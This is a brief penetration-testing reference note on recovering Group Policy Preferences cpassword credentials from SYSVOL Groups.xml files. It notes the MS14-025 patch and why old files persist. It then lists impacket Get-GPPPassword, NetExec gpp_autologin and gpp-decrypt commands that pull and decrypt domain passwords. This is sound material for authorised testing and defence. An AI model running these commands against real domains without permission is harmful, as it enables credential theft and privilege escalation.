---
tags:
  - Authenticated
  - Lateral-Movement
  - Privilege-Escalation
  - SMB
  - Unauthenticated
  - AD
---
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.
## Identify
---

Tools: impacket, [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)


This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
Groups.xml

cpassword field
## Exploit
---

Check null pass first (higher severity)

```bash
impacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
```

with creds

```bash
impacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```


or

```Bash
nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin
```

Then decrypt:

```Bash
gpp-decrypt <cpasswd>
```